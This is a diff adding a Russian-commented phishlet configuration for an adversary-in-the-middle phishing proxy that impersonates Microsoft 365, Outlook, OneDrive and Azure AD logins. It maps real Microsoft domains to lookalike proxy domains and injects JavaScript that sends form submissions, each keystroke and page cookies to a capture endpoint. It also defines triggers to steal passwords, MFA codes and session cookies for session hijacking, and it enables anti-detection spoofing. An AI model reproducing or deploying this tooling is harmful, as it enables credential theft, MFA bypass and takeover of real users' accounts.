@@ -1,0 +1,273 @@
+# ============================================================================
+# Microsoft 365 / Outlook / OneDrive Phishlet
+# Высокопроизводительный шаблон для перехвата сессий Microsoft
+# ============================================================================
+
+id: microsoft365
+name: Microsoft 365 (Outlook/OneDrive/Teams)
+author: PhantomProxy Team
+version: "2.0"
+description: |
+  Полный перехват сессий Microsoft 365 включая:
+  - Outlook Web Access
+  - OneDrive
+  - Microsoft Teams
+  - SharePoint
+  - Azure AD
+
+# Целевые домены
+target:
+  primary: "login.microsoftonline.com"
+  secondary:
+    - "outlook.office365.com"
+    - "www.office.com"
+    - "portal.office.com"
+    - "login.live.com"
+    - "account.microsoft.com"
+    - "graph.microsoft.com"
+
+# Замена доменов (domain spoofing)
+sub_filters:
+  # Основные домены Microsoft
+  - type: "domain"
+    from: "login.microsoftonline.com"
+    to: "login.phantom-proxy.com"
+    priority: 1
+    
+  - type: "domain"
+    from: "outlook.office365.com"
+    to: "outlook.phantom-proxy.com"
+    priority: 2
+    
+  - type: "domain"
+    from: "www.office.com"
+    to: "office.phantom-proxy.com"
+    priority: 3
+    
+  - type: "domain"
+    from: "portal.office.com"
+    to: "portal.phantom-proxy.com"
+    priority: 4
+    
+  - type: "domain"
+    from: "login.live.com"
+    to: "login-live.phantom-proxy.com"
+    priority: 5
+    
+  - type: "domain"
+    from: "account.microsoft.com"
+    to: "account.phantom-proxy.com"
+    priority: 6
+
+  # CDN и ресурсы
+  - type: "domain"
+    from: "res.cdn.office.net"
+    to: "cdn.phantom-proxy.com"
+    priority: 100
+
+# JavaScript инъекции
+js_inject: |
+  (function() {
+    'use strict';
+    
+    console.log('[PhantomProxy] Microsoft 365 phishlet loaded');
+    
+    // Перехват отправки форм
+    document.addEventListener('submit', function(e) {
+      const form = e.target;
+      console.log('[PhantomProxy] Form submitted:', form.action);
+      
+      // Сохраняем все input поля
+      const formData = new FormData(form);
+      const data = {};
+      formData.forEach((value, key) => {
+        data[key] = value;
+      });
+      
+      // Отправляем данные на прокси
+      fetch('/api/capture', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          type: 'form_submit',
+          action: form.action,
+          data: data,
+          url: window.location.href
+        })
+      });
+    }, true);
+    
+    // Перехват input полей в реальном времени
+    document.addEventListener('input', function(e) {
+      if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+        const field = e.target;
+        if (field.name || field.id) {
+          console.log('[PhantomProxy] Field input:', field.name || field.id);
+          
+          // Debounce - отправляем только после паузы
+          clearTimeout(field._phantomTimeout);
+          field._phantomTimeout = setTimeout(() => {
+            fetch('/api/capture', {
+              method: 'POST',
+              headers: {'Content-Type': 'application/json'},
+              body: JSON.stringify({
+                type: 'field_input',
+                field: field.name || field.id,
+                value: field.value,
+                url: window.location.href
+              })
+            });
+          }, 1000);
+        }
+      }
+    }, true);
+    
+    // Перехват cookies при загрузке
+    window.addEventListener('load', function() {
+      fetch('/api/capture', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          type: 'cookies',
+          cookies: document.cookie,
+          url: window.location.href,
+          userAgent: navigator.userAgent
+        })
+      });
+    });
+    
+    // Обход обнаружения DevTools
+    const originalToString = Function.prototype.toString;
+    Function.prototype.toString = function() {
+      if (this.name === 'toString' || this.name === 'constructor') {
+        return originalToString.call(this);
+      }
+      return originalToString.call(this);
+    };
+    
+    // Скрытие индикаторов прокси
+    Object.defineProperty(navigator, 'webdriver', {
+      get: () => false
+    });
+    
+    console.log('[PhantomProxy] Microsoft 365 phishlet active');
+  })();
+
+# Триггеры для перехвата
+triggers:
+  # Страница входа
+  - name: "login_page"
+    path_regex: "/common/oauth2/v2.0/authorize|/login.srf|/oauth20_authorize.srf"
+    actions:
+      - type: "inject_js"
+        payload: "login_inject.js"
+      - type: "capture_form"
+        fields: ["login", "passwd", "Password", "UserName"]
+        
+  # MFA страница
+  - name: "mfa_page"
+    path_regex: "/multifactor|/mfa|/twoFactor"
+    actions:
+      - type: "capture_form"
+        fields: ["otp", "code", "verificationCode", "mfaCode"]
+      - type: "wait_for_input"
+        timeout: 300
+        
+  # Основная страница Outlook
+  - name: "outlook_main"
+    host_regex: "outlook.*|office.*"
+    actions:
+      - type: "capture_cookies"
+        cookies: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "OpenIdConnectState", "SessionId"]
+      - type: "session_hijack"
+        enabled: true
+        
+  # OneDrive
+  - name: "onedrive"
+    path_regex: "/onedrive|/personal.aspx"
+    actions:
+      - type: "capture_cookies"
+        cookies: ["WOPISrc", "access_token"]
+
+# Куки для перехвата
+cookies:
+  critical:
+    - "ESTSAUTH"
+    - "ESTSAUTHPERSISTENT"
+    - "rtFa"
+    - "FedAuth"
+    - "X-MS-Gateway-SSO"
+    
+  session:
+    - "SessionId"
+    - "cltrId"
+    - "aadssotoken"
+    
+  additional:
+    - "MSOSSID"
+    - "MSOPTH"
+    - "CnF"
+    - "PPFT"
+
+# Заголовки для сохранения
+headers:
+  - "Authorization"
+  - "X-MS-Client-Principal"
+  - "X-MS-Client-Principal-Id"
+  - "X-MS-Endpoint-Source-IP"
+
+# Обход защиты
+anti_detection:
+  # Скрытие webdriver
+  hide_webdriver: true
+  
+  # Подмена navigator
+  spoof_navigator: true
+  
+  # Обход обнаружения DevTools
+  anti_devtools: true
+  
+  # Рандомизация таймингов
+  random_timings: true
+  
+  # Canvas fingerprint spoofing
+  canvas_spoof: true
+
+# Настройки производительности
+performance:
+  # Кэширование ресурсов
+  cache_static: true
+  
+  # Сжатие ответов
+  compress_responses: true
+  
+  # Lazy loading для изображений
+  lazy_images: true
+  
+  # Минификация JS
+  minify_js: true
+
+# SSL/TLS настройки
+ssl:
+  # Минимальная версия TLS
+  min_version: "TLS1.2"
+  
+  # Cipher suites (Chrome 133)
+  cipher_suites:
+    - "TLS_AES_128_GCM_SHA256"
+    - "TLS_AES_256_GCM_SHA384"
+    - "TLS_CHACHA20_POLY1305_SHA256"
+
+# Логирование
+logging:
+  # Логировать все запросы
+  log_requests: true
+  
+  # Логировать ответы
+  log_responses: true
+  
+  # Логировать ошибки
+  log_errors: true
+  
+  # Путь к логам
+  log_path: "./logs/microsoft365/"
